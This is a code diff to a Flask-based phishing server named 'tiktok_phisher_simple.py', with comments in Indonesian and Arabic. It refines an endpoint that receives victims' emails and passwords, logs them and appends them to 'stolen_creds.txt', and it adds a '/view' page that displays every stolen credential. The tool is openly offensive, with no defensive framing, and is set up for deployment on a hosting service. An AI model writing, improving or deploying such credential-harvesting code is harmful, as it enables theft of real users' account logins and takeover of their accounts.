@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 tiktok_phisher_simple.py
-Server Phishing Sederhana (Render Ready - Clean).
+Server Phishing Sederhana (Render Ready).
 """
 
 import os
@@ -58,18 +58,34 @@ def index():
 @app.route('/capture', methods=['POST'])
 def capture():
     data = request.json
-    print("\n" + "="*50)
-    print("[!] 🚨 بيانات جديدة! 🚨")
-    print(f"User: {data.get('email')}")
-    print(f"Pass: {data.get('password')}")
-    print("="*50 + "\n")
+    email = data.get('email')
+    password = data.get('password')
     
-    with open("stolen_creds.txt", "a", encoding="utf-8") as f:
-        f.write(f"User: {data.get('email')} | Pass: {data.get('password')}\n")
+    print("\n" + "!"*60)
+    print("[🚨] DATA PHISHING DITEMUKAN! [🚨]")
+    print(f"[📧] Username/Email: {email}")
+    print(f"[🔑] Password: {password}")
+    print("!"*60 + "\n")
+    
+    try:
+        with open("stolen_creds.txt", "a", encoding="utf-8") as f:
+            f.write(f"User: {email} | Pass: {password}\n")
+    except Exception as e:
+        print(f"[-] Gagal simpan file: {e}")
         
     return jsonify({"status": "ok"}), 200
 
+@app.route('/view')
+def view():
+    try:
+        with open("stolen_creds.txt", "r", encoding="utf-8") as f:
+            content = f.read()
+        if not content:
+            return "<h2>Belum ada data yang tertangkap.</h2>"
+        return f"<h2>Data Tertangkap:</h2><pre style='background:#f4f4f4; padding:20px;'>{content}</pre>"
+    except FileNotFoundError:
+        return "<h2>Belum ada data yang tertangkap.</h2>"
+
 if __name__ == '__main__':
-    # Render بيحدد البورت أوتوماتيك، إحنا بنقراه من env
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
